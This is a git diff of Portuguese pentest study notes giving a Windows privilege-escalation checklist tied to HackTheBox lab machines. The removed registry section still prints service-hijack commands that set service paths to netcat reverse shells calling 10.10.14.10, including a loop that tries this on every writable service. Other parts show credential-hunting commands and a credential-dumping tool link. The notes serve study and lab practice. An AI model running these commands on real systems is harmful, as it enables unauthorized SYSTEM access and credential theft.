@@ -3,17 +3,17 @@
 ## Checklist
 
 - [ ] [**Permissão do usuário**](#permissao%20de%20usuario)
-- [ ] [**Navegar nos diretórios do usuário**](#navegacao%20diretorios)
-- [ ] [**WinPeas e PowerUp**](#winpeas%20e%20powerup)
-- [ ] [**Senhas salvas no registro**](#credenciais%20no%20registro)
+- [ ] [**Navegar nos diretórios do usuário**](#navegacao-diretorios)
+- [ ] [**WinPeas e PowerUp**](#winpeas-e-powerup)
+- [ ] [**Senhas salvas no registro**](#credenciais-no-registro)
 - [ ] [**Enumerar serviços locais/restritos**](#enumeracao-de-servicos)
-- [ ] [**Enumerar scheduled tasks/tarefas agendadas**](#scheduled%20tasks)
+- [ ] [**Enumerar scheduled tasks/tarefas agendadas**](#scheduled-tasks)
 - [ ] [**Versão de kernel**](#versao-de-kernel)
 - [ ] [**Reutilização de credenciais já obtidas**](#reuso-de-senha)
 - [ ] [**Explorando Unquoted Service Path**](#unquoted-service-path)
-- [ ] [**Enumeração de processos da máquina**](#enumeracao%20de%20processos)
+- [ ] [**Enumeração de processos da máquina**](#enumeracao-de-processos)
 - [ ] [**AlwaysInstallElevated**](#alwaysinstallelevated)
-- [ ] [**Credenciais em cache**](#credenciais%20em%20cache)
+- [ ] [**Credenciais em cache**](#credenciais-em-cache)
 - [ ] [**Enumerar dispositivos da máquina**](#enumerar-dispositivos-da-maquina)
 - [ ] [**Enumerar senhas por meio de arquivos de configuração, anotações de usuários, etc...**](#enumeracao-de-senhas)
 - [ ] [**Permissionamento de arquivos**](#permissionamento-de-arquivos-e-pastas)
@@ -23,8 +23,7 @@ Depois considerar esse link para verifcar uma ferramenta para obtenção de cred
 https://github.com/putterpanda/mimikittenz
 
 <details markdown="1"><summary markdown="1">
-## Permissao de usuario
-
+## Permissão de usuário
 </summary>
 
 Aqui estamos a procura de permissões tais como:
@@ -114,8 +113,7 @@ Vide máquina [BlackField](../../../CTFs_Labs/HackTheBox/Blackfield#privesc)
 </details>
 
 <details markdown="1"><summary markdown="1">
-## Navegacao diretorios
-
+## Navegação diretórios
 </summary>
 
  Navegar nos diretorios do usuario para ver se existe algo ali que possa nos fornecer uma credencial ou algum bionario que inicie um servico/programa vulneravel a escalacao de privilegio
@@ -223,7 +221,7 @@ Vide máquina [Sauna](../../../CTFs_Labs/HackTheBox/Sauna#privilege-escalation)
 </details>
 
 <details markdown="1"><summary markdown="1">
-## Enumeracao de Serviços
+## Enumeração de Serviços
 </summary>
 
 Checar os servicos que estao rodando na maquina para ver se temos permissao de alteracao em algum deles
@@ -244,11 +242,7 @@ Enumerando as interfaces de rede
     ipconfig /all
     route print
 
-## Permissionamento fraco de servicos
-
-Para o cenário de permissionamento fraco desses serviços, temos de considerar basicamente três cenários, sendo eles:
-
-Fragilidade de permissionamento nos binários dos serviços ou nas pastas do serviço. Exemplo:
+### Weak service permissions
 
 ![qownnotes-media-jCADRm](../../../media/qownnotes-media-jCADRm.png)
 
@@ -256,202 +250,23 @@ Fragilidade de permissionamento nos binários dos serviços ou nas pastas do ser
 
     ./accesschk.exe -ucwqv UsoSvc /accepteula
     
-```
-./accesschk.exe -ucwqv <servicename> /accepteula
-```
+    ./accesschk.exe -ucwqv <servicename> /accepteula
 
 Com esse comando, verificamos que estamos no grupo NTAUTHORITY/SERVICE
     
-```
-whoami /all
-```
+    whoami /all
 
 ![qownnotes-media-zdSaRr](../../../media/qownnotes-media-zdSaRr.png)
 
-```
-sc.exe config usosvc binpath="C:\temp\rev.exe"
-```
+    sc.exe config usosvc binpath="C:\temp\revshell.exe"
 
 ![qownnotes-media-QfiKZv](../../../media/qownnotes-media-QfiKZv.png)
 
-```
-net stop usosvc
-net start usosvc
-```
+    net stop usosvc
+    net start usosvc
 
 Vide máquina [Remote](../../../CTFs_Labs/HackTheBox/Remote#privilege-escalation)
 
-### Permissoes fracas de registro
-
-- [ ] Checar se temos permissão no registro do serviço
-- [ ] Checar se o serviço roda com usuário SYSTEM
-- [ ] Checar se temos permissão de iniciar ou parar o serviço
-- [ ] Checar caso tenhamos a possibilidade de reiniciar a máquina (SeShutdownPrivilege)
-
-Aqui o objetivo e identificar algum servico que possamos utilizar para exploraçao utilizando chaves de registro... Para isso, primeiro vamos verificar quais grupos que nosso usuário pertence com:
-
-```
-whoami /all
-```
-
-![[../../../media/Pasted image 20240606004413.png]]
-**IMPORTANTE DIZER QUE TEMOS QUE LEVAR EM CONTA OS GRUPOS QUE O USUÁRIO FAZ PARTE PARA ADEQUARMOS OS FILTROS PARA IDENTIFICARMOS OS SERVIÇOS VULNERÁVEIS**
-
-accesscheck (**Utilizar accesschk 5.2 caso 6.0 nao funcionar**)
-
-**a.exe = accesschk.exe**
-
-Checar as permissões dos serviços:
-```
-a.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\ | more
-```
-ou
-```
-a.exe /accepteula -uk HKLM\System\CurrentControlSet\Services\ | more
-```
-
-Variações dos filtros:
-
-```
-accesschk64.exe "Everyone" -kqswvu hklm\System\CurrentControlSet\services -accepteula
-
-accesschk64.exe "Authenticated Users" -kqswvu hklm\System\CurrentControlSet\services -accepteula
-
-accesschk64.exe "BUILTIN\Users" -kqswvu hklm\System\CurrentControlSet\services -accepteula
-
-accesschk64.exe "NT AUTHORITY\INTERACTIVE" -kqswvu hklm\System\CurrentControlSet\services -accepteula
-```
-
-Porem aqui o problema e filtrar os serviços na maquina que são relacionados. Temos de encontrar os que são executados por meio do usuário system...
-
-```
-Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\* | where {($_.ObjectName -match 'LocalSystem') -and ($_.Start -eq 3)}
-```
-
-powershell
-
-Esse comando serve para obter todos os serviços que constam na máquina e o permissionamento em cada um deles ( vale uma analisada manual )
-
-```
-Get-Acl HKLM:\System\CurrentControlSet\Services\* | format-list
-```
-
-Mas temos de filtrar os quais podemos utilizar para subir privilegios. Entao temos de obter o nome de todos os servicos de maneira filtrada com o seguinte comando:
-
-```
-(get-services).name
-```
-
-Esse filtro é para verificar se o usuário tem permissão para alterar
-```
-Get-Acl HKLM:\System\CurrentControlSet\Services\* | format-list | findstr /i "$env:username path"
-```
-
-![[../../../media/Pasted image 20240606002133.png]]
-
-Uma alternativa ao comando anterior:
-```
-get-acl -path HKLM:\system\currentcontrolset\services\* | where {($_.access.IdentityReference.value -match "Hector")}
-```
-
-Porém, temos de considerar serviços que são executados com usuário SYSTEM e que podemos iniciar manualmente o estado do serviço. Considere a tabela abaixo
-
-![[../../../media/Pasted image 20240605192944.png]]
-Com o comando abaixo estamos verificando quais serviços dos filtrados acima estão sendo executados como System e se está definido como modo manual de start/stop do serviço conforme tabela acima:
-
-```
-Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\* | where {($_.ObjectName -match 'LocalSystem') -and ($_.Start -eq 3)}
-```
-
-Parte do comando abaixo já foi explicado anteriormente, no entanto a formatação do resultado do comando é importante para considerar somente serviços que fazem sentido para escalar privilégios:
-
-```
-((get-acl -path HKLM:\system\currentcontrolset\services\* | where {($_.access.IdentityReference.value -match "$env:username")} | foreach-object { $_.path.split("\\")[5] }) | foreach-object {Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\$_ | where {($_.ObjectName -match 'LocalSystem') -and ($_.Start -eq 3)}}).pschildname
-```
-
-Uma vez identificado o serviço que devemos explorar com base nos filtros que utilizamos, já podemos alterar o binário por meio da chave de registro:
-
-**EXPLORAÇÃO**
-```
-reg add HKLM\SYSTEM\CurrentControlSet\services\<nome_servico> /v ImagePath /t REG_EXPAND_SZ /d "c:\temp\nc.exe -e powershell 10.10.14.10 8085" /f
-```
-**EXPLORAÇÃO**
-
-Podemos também utilizar uma abordagem de "força bruta" para testar todos os serviços encontrados, pois em alguns exemplos de máquinas (embora tudo fosse condizente com a possibilidade de subir privilégio) não foi possível subir privilégio. Dessa forma, vamos testar um a a um:
-
-```
-$filtered_services = ((get-acl -path HKLM:\system\currentcontrolset\services\* | where {($_.access.IdentityReference.value -match "$env:username")} | foreach-object { $_.path.split("\\")[5] }) | foreach-object {Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\$_ | where {($_.ObjectName -match 'LocalSystem') -and ($_.Start -eq 3)}}).pschildname
-```
-
-```
-foreach ($service in $filtered_services) { 
-  $sddl = (cmd /c sc sdshow $service)[1]; 
-  $reg = gp -path hklm:\system\currentcontrolset\services\$service; 
-  if ($sddl -match "RP[A-Z]*?;;;AU") { 
-    write-host "Trying to hijack $service"; 
-    $old_path = (get-itemproperty HKLM:\system\currentcontrolset\services\wuauserv).ImagePath; 
-    set-itemproperty -erroraction silentlycontinue -path HKLM:\system\currentcontrolset\services\$service -name imagepath -value "c:\temp\nc.exe -e cmd 10.10.14.10 8085"; 
-    start-service $service -erroraction silentlycontinue; 
-    set-itemproperty -path HKLM:\system\currentcontrolset\services\$service -name imagepath -value $old_path 
-  }
-}
-```
-
-```
-if ($sddl -match "RP[A-Z]*?;;;AU") # Nesta linha é importante dizer que estamos filtrando os serviços que temos opção de iniciar ou parar
-```
-uma alternativa a esse comando pode ser com o accesschk.exe:
-
-```
-./a.exe /accepteula -ucqv wuauserv
-```
-
-![[../../../media/Pasted image 20240606003954.png]]
-
-Existe a possibilidade de fazer isso no Linux também:
-
-```
-Get-Acl -Path hklm:\System\CurrentControlSet\services\* | Format-List | Out-File -FilePath C:\temp\service_keys.txt
-```
-
-```
-impacket-smbserver -smb2support smb .
-```
-
-```
-copy C:\temp\service_keys.txt \\172.16.1.30\smb
-```
-
-Os comandos abaixo vai depender de cada situação e deve ser ajustado conforme o output dos comandos:
-```
-cat service_keys.txt | grep -i "Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users"
-cat service_keys.txt | grep -i "Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users" | grep -v "ReadKey"
-cat service_keys.txt | grep -i "Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users" | grep -v "ReadKey" | grep -B 1 -i "Authenticated Users|\BUILTIN\\\Users\|Everyone\|INTERACTIVE\|FullControl\|Modify\|Write"
-```
-
-```
-Get-Acl -Path hklm:\System\CurrentControlSet\services\Juggernaut | Format-List
-```
-```
-reg query "HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Juggernaut"
-```
-```
-Get-Item -Path Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Juggernaut
-```
-```
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Juggernaut" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\pwnt.exe" /f
-```
-```
-shutdown /r /t 0
-```
-
-
-Fontes: 
-<https://pentestlab.blog/2017/03/30/weak-service-permissions/>
-<https://medium.com/r3d-buck3t/abuse-service-registry-acls-windows-privesc-f88079140509>
-<https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/>
-Mais completo:
-<https://juggernaut-sec.com/weak-registry-key-permissions/>
 </details>
 
 <details markdown="1"><summary markdown="1">
@@ -594,9 +409,7 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 ```
 Podemos utilizar uma abordagem com o registro do Windows também:
 
-```
-reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\
-```
+    reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\
 
 Para ter um pouco mais de precisão, podemos utilizar findstr:
 
@@ -611,7 +424,7 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 </details>
 
 <details markdown="1"><summary markdown="1">
-## Enumeracao de processos
+## Enumeração de processos
 </summary>
 ```
 get-process
@@ -684,24 +497,18 @@ Depois dee enumerar, eh interessante montarmos o volume pra verificar se temos a
 </details>
 
 <details markdown="1"><summary markdown="1">
-## Enumeracao de senhas
+## Enumeração de senhas
 </summary>
 
 Vale ressaltar que com o comando do findstr eu não tive sucesso na procura, porém, para algumas versões do Windows está funcional:
 
 
-```
-findstr /si password *.doc *.txt *.ini *.config
-```
-
-	
-	dir /s *pass* == *cred* == *ssh* == *.config*
+    findstr /si password *.doc *.txt *.ini *.config
+    dir /s *pass* == *cred* == *ssh* == *.config*
 
 **O comando abaixo foi o que funcionou para procurar strings via CMD**
 
-```
-for /r %a in (\*.*) do find /i "password" %a
-```
+    for /r %a in (\*.*) do find /i "password" %a
     
 Powershell. Esse comando vale a pena procurar em locais específicos, porque ele trás um resultado bem grande...
 
